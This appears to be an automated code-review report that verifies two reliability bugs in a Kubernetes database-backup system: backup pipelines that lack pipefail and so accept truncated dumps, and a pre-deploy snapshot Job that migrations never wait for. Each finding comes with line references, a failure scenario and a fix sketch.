verify_reason: Traced the exact path in operator/helm-charts/kusoaddon/templates/backup-cronjob.yaml. Postgres (line 64 `set -eu`, lines 78-80 `pg_dump | gzip > /tmp/dump.gz`) and MySQL (lines 518, 527) pipelines take gzip's exit status under plain `set -eu` — a pg_dump/mysqldump connect or mid-stream failure yields a valid empty/truncated gzip, gzip exits 0, and lines 81-92 (resp. 528-534) sha256 the broken artifact, write a matching manifest, upload, and the Job completes. The external-postgres path (lines 213, 231-233) is worse: `pg_dump | gzip | aws s3 cp -` takes aws's status AND writes no manifest at all. Downstream defenses all fail as claimed: backuphealth (server-go/internal/backuphealth/backuphealth.go:102-106,214) keys only on Job Succeeded/Failed so no alert fires; restore verification (server-go/internal/backup/registry.go:42-51) compares against the manifest sha computed over the already-broken file, so it prints "checksum OK" and applies an empty dump; the retention prune (lines 101-115) runs on every such run and erases the last good dumps after RETENTION_DAYS. Contrast evidence verified: registry.go:37/75/103/135 and cmd/kuso-server/snapshot_adapter.go:55 all use `set -eo pipefail` in scripts running in the same kuso-backup image, so pipefail is available and the omission is inconsistent, not a portability constraint. Redis/mongodb/s3 paths are non-pipeline and correctly excluded from the claim. Severity P1: realistic triggers (password drift has occurred in this project; DB restart during cron window), silent unrecoverable-backup outcome, but not attacker-exploitable and needs a coinciding primary loss to become data loss — so P1, not P0.

title: Pre-deploy snapshot is fire-and-forget: migration starts before the snapshot Job runs or is verified
summary: CreateSnapshotJob returns the S3 key immediately after Jobs().Create() with no wait for completion, and the build poller (builds.go:2669-2681) proceeds straight into ReleaseRunner.Run — so the migration mutates the DB concurrently with (or before) the snapshot pod's pg_dump, and a snapshot Job that fails outright (BackoffLimit=0, e.g. 'backup S3 not configured' exits 1 at snapshot_adapter.go:56-58) is never detected: the key is still stamped onto the release-failed build as the restore point.
evidence: snapshot_adapter.go:114-117 creates the Job and returns key with no poll; builds.go:2670-2681: `keys, serr := runPredeploySnapshot(...)` (error only covers Job CREATION) then immediately `p.ReleaseRunner.Run(...)`. markReleaseFailedWithSnapshot (builds.go ~2893) records those keys as 'restore to pre-deploy' targets regardless of whether the snapshot pod ever produced the object. The snapshot pod must schedule + pull ghcr.io/sislelabs/kuso-backup:latest before pg_dump even begins its transaction, while the release Job's init container only waits for DB reachability.
failure_scenario: Env has snapshotBeforeDeploy=true. Build finishes; snapshot Job is created; the release Job's migrate starts 2s later while the snapshot pod is still pulling its image. Migration drops+rebuilds a table wrongly and fails halfway; pg_dump then snapshots the half-broken schema (or the snapshot Job failed entirely because the S3 secret was missing in the project namespace — nothing mirrors it here, unlike Restore's mirrorBackupSecret). The build's predeploy-snapshot-keys annotation points at a post-corruption or nonexistent artifact; the operator 'restores to pre-deploy' and gets the broken state back — the safety net that justified proceeding into the migration never existed.
fix_sketch: Poll the snapshot Job to Complete (like releaserun.poll) before invoking ReleaseRunner.Run, verify the S3 object exists, and mirror kuso-backup-s3 into per-project namespaces the way Restore does (backups.go:413-423).
verify_reason: Every link in the claimed failure path exists in the code. (1) snapshot_adapter.go:114-117 returns the S3 key immediately after Jobs().Create with no completion poll; PredeploySnapshotter.Snapshot (internal/builds/snapshotter.go:46-64) adds no wait; grep confirms nothing anywhere watches role=snapshot Jobs. (2) builds.go:2670-2681 treats only Job-creation error as failure, then immediately calls ReleaseRunner.Run; the release Job's sole gate is the wait-for-addons initContainer (releaserun.go:55-111), a TCP nc -z reachability check that never references the snapshot Job — so the migration starts unordered relative to pg_dump's transaction, and the 'pre-deploy' snapshot can capture mid/post-migration state. (3) The snapshot Job's S3 env refs are Optional=true against kuso-backup-s3 in the project execution namespace (snapshot_adapter.go:49,103-107); SetSettings writes that Secret only into the home namespace and the Restore path explicitly mirrors it (backups.go:403-425, mirrorBackupSecret at :571) — the snapshot adapter does not, so per-project-namespace projects deterministically hit the 'backup S3 not configured' exit 1 with BackoffLimit=0 and no detection. (4) markReleaseFailedWithSnapshot (builds.go:2892-2904) unconditionally stamps predeploy-snapshot-keys with the returned keys, so the restore pointer can target a post-corruption or nonexistent artifact.
